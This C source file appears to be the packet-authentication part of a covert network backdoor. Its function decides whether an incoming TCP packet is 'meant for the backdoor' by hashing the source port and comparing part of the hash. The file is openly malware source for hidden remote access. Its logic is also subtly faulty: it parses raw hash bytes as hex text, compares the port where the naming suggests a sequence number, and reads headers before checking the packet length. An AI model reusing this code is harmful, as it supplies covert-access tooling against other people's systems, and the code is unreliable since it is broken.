#include "packet_auth.h"

#include <stdio.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <openssl/sha.h>

/*
 * Calculates the SHA256 hash of a given input.
 *
 * Params:
 *      const unsigned char *input: The buffer to hash.
 *      const int input_length: The length of the input.
 *      unsigned char *output: The buffer to store the hash. Must be 32 bytes in size.
 */
void sha256_hash(const unsigned char *input, const int input_length, unsigned char *output)
{
    SHA256_CTX ctx;
    SHA256_Init(&ctx);
    SHA256_Update(&ctx, input, input_length);
    SHA256_Final(output, &ctx);
}

/*
 * Converts hex to unsigned integer. Taken from user radhoo on stackoverflow.com.
 *
 * Params:
 *      char *hex: Pointer to null terminated string with hex value.
 *
 * Returns:
 *      The unsigned int representation of the next string.
 */
unsigned int hex_to_uint(char *hex)
{
    unsigned int val = 0;

    while (*hex)
    {
        unsigned char byte = *hex++;

        if (byte >= '0' && byte <= '9')
        {
            byte = byte - '0';
        }
        else if (byte >= 'a' && byte <= 'f')
        {
            byte = byte - 'a' + 10;
        }
        else if (byte >= 'A' && byte <= 'F')
        {
            byte = byte - 'A' + 10;
        }

        val = (val << 4) | (byte & 0xF);
    }

    return val;
}

/*
 * Checks if the packet is meant for the backdoor or not.
 *
 * Params:
 *      const unsigned char *packet: The buffer containing the packet.
 *      const int packet_len: The length of the packet.
 *
 * Returns:
 *      1 if the packet is authenticated, 0 otherwise.
 */
int is_packet_authenticated(const unsigned char *packet, const int packet_len)
{
    char source_port_string[6];
    char calc_hash_buffer[32];

    unsigned int calc_seq_num;

    struct iphdr* ip = (struct iphdr*)packet;
    struct tcphdr* tcp = (struct tcphdr*)(packet + (ip->ihl * 4));

    if (packet_len < sizeof(struct iphdr) + sizeof(struct tcphdr))
    {
        return 0;
    }

    sprintf(source_port_string, "%d", tcp->source);
    sha256_hash(source_port_string, strlen(source_port_string), calc_hash_buffer);

    // hex_to_int is a string function so place null char at index 9
    calc_hash_buffer[8] = 0;
    calc_seq_num = hex_to_uint(calc_hash_buffer);

    if (tcp->source != calc_seq_num)
    {
        return 0;
    }

    return 1;
}
